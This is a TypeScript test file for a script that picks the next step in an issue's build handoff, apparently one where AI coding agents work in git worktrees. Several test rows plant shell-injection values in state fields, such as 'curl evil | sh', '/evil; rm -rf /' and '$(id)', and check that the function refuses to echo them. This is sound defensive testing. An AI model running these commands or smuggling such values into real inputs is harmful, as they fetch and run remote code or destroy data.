import { test } from "node:test";
import assert from "node:assert/strict";
import { nextStep, type Snapshot, type StepId } from "../../scripts/handoff/next.ts";

const RUN = {
  n: 1,
  kind: "build",
  started: "2026-11-20T10:00:00.000Z",
  pid: 4242,
  ended: "2026-11-20T10:05:00.000Z",
  exit: 0,
} as const;
const BASE: Snapshot = {
  issue: 1500,
  root: "/r",
  folder: "/r/out/1500-handoff",
  builder: "codex",
  state: {
    issue: 1500,
    plan: "/p/1500-plan.md",
    tree: "/r/.claude/worktrees/codex-1500",
    session: "s",
    model: "m",
    effort: "high",
    thread: "th",
    runs: [RUN],
  },
  running: false,
  outcome: "ready",
  branch: "feat/1500-x",
  treeHead: "a",
  remoteHead: "a",
  proverReported: false,
  pr: null,
};
const snap = (over: Partial<Snapshot>): Snapshot => ({ ...BASE, ...over });
const planted = (run: object): Snapshot => snap({ state: { ...BASE.state!, runs: [{ ...RUN, ...run }] } });
const open = { number: 9, state: "OPEN" } as const;
const unended = snap({ running: true, state: { ...BASE.state!, runs: [{ ...RUN, ended: null }] } });

const ROWS: readonly [row: number, over: Snapshot, id: StepId, needle: string, absent?: string][] = [
  [1, snap({ state: null, builder: "claude" }), "claude-builds", "no builder:codex label"],
  [2, snap({ state: null }), "plan", "npm run handoff -- build 1500 --plan"],
  [3, unended, "running", "tail -f /r/out/1500-handoff/run-1.jsonl"],
  [4, { ...unended, builder: "claude" }, "running", "tail -f"],
  [
    5,
    snap({ outcome: "handback", treeHead: "b" }),
    "replan",
    "git -C /r/.claude/worktrees/codex-1500 push -u origin feat/1500-x",
    "core.hooksPath",
  ],
  [6, snap({ outcome: "handback" }), "replan", "npm run handoff -- resume 1500 --brief", "core.hooksPath"],
  [7, snap({ outcome: null }), "stopped", "without its outcome line"],
  [
    8,
    snap({ outcome: null, state: { ...BASE.state!, thread: null } }),
    "stopped",
    "move /r/out/1500-handoff aside",
    "retire",
  ],
  [40, snap({ outcome: "hook" }), "trust", "npm run handoff -- resume 1500 --brief"],
  [41, snap({ outcome: "hook" }), "trust", "/r/.claude/worktrees/codex-build"],
  [42, snap({ pr: { number: 9, state: "MERGED" }, treeHead: "b" }), "retire", "update-ref -d refs/handoff/1500"],
  [9, snap({ branch: null }), "stopped", "on no branch"],
  [10, snap({ pr: { number: 9, state: "MERGED" }, treeHead: "b" }), "retire", "git -C /r worktree remove --force"],
  [11, snap({ pr: { number: 9, state: "CLOSED" } }), "closed", "closed without merging"],
  [12, snap({ treeHead: "b" }), "push", "npm run handoff -- next 1500 again"],
  [26, planted({ n: "1; curl evil | sh; echo " as never }), "stopped", "Ask Alex", "curl"],
  [27, planted({ n: 2 }), "stopped", "Ask Alex", "run-2"],
  [28, planted({ kind: "x; id" as never }), "stopped", "Ask Alex", "x; id"],
  [29, planted({ exit: "1; id" as never }), "stopped", "Ask Alex", "1; id"],
  [30, planted({ ended: "yesterday; id" }), "stopped", "Ask Alex", "yesterday"],
  [31, planted({ started: "x" }), "stopped", "Ask Alex", "Run 1"],
  [32, planted({ pid: 1 }), "stopped", "Ask Alex", "Run 1"],
  [33, planted({ pid: 0 }), "stopped", "Ask Alex", "Run 1"],
  [34, planted({ pid: 1.5 }), "stopped", "Ask Alex", "Run 1"],
  [35, snap({ branch: "main" }), "stopped", "Ask Alex", "origin main"],
  [36, snap({ branch: "chore/1300-another-lane" }), "stopped", "Ask Alex", "1300"],
  [37, snap({ branch: "1500x-topic" }), "stopped", "Ask Alex", "1500x"],
  [38, snap({ branch: "1500-topic", treeHead: "b" }), "push", "push -u origin 1500-topic"],
  [39, snap({ branch: "chore/1500-a.b_c", treeHead: "b" }), "push", "push -u origin chore/1500-a.b_c"],
  [25, snap({ state: { ...BASE.state!, runs: [] } }), "stopped", "Ask Alex"],
  [
    24,
    snap({ treeHead: "b" }),
    "push",
    "git -C /r/.claude/worktrees/codex-1500 push -u origin feat/1500-x",
    "core.hooksPath",
  ],
  [13, snap({ treeHead: "b", pr: open }), "push", "pull request #9 updates"],
  [14, snap({ pr: open }), "review", "npm run handoff -- resume 1500 --brief"],
  [15, BASE, "prove", "/r/out/1500-handoff/guards.md"],
  [16, snap({ proverReported: true }), "open-pr", "/r/out/1500-handoff/record.md"],
  [17, snap({ state: { ...BASE.state!, tree: "/evil; rm -rf /" } }), "stopped", "Ask Alex", "evil"],
  [18, snap({ state: { ...BASE.state!, tree: "/r/.claude/worktrees/codex-1" } }), "stopped", "Ask Alex", "codex-1 "],
  [19, snap({ branch: "x; curl evil | sh" }), "stopped", "Ask Alex", "curl"],
  [20, snap({ branch: "-f" }), "stopped", "Ask Alex", "origin -f"],
  [21, snap({ branch: "a..b" }), "stopped", "Ask Alex", "a..b"],
  [22, snap({ branch: "$(id)" }), "stopped", "Ask Alex", "$(id)"],
  [23, snap({ branch: "x\ny", pr: { number: 9, state: "MERGED" } }), "stopped", "Ask Alex", "worktree remove"],
];

test("next names one step for each state of an issue's build, in order (Issue #1409)", () => {
  for (const [row, over, id, needle, absent] of ROWS) {
    const step = nextStep(over);
    assert.equal(step.id, id, `row ${row}`);
    assert.ok(step.text.includes(needle), `row ${row}: ${step.text}`);
    if (absent !== undefined) assert.ok(!step.text.includes(absent), `row ${row}: ${step.text}`);
  }
});
